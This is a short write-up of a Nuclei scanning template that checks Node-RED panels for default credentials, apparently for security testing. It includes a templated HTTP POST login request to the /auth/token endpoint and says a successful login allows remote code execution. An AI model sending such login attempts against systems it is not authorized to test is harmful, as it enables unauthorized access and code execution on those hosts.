# Nuclei Template: Node-Red - Default Login
**Template ID:** nodered-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** Critical
**Source:** Nuclei Template (`nodered-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Allows attacker to log in and execute RCE on the Node-Red panel using the default credentials.

## Steps to reproduce / Exploit Payload
```http
POST /auth/token HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded;charset=UTF-8

client_id=node-red-editor&grant_type=password&scope=&username={{username}}&password={{password}}
```

## References
- https://quentinkaiser.be/pentesting/2018/09/07/node-red-rce/
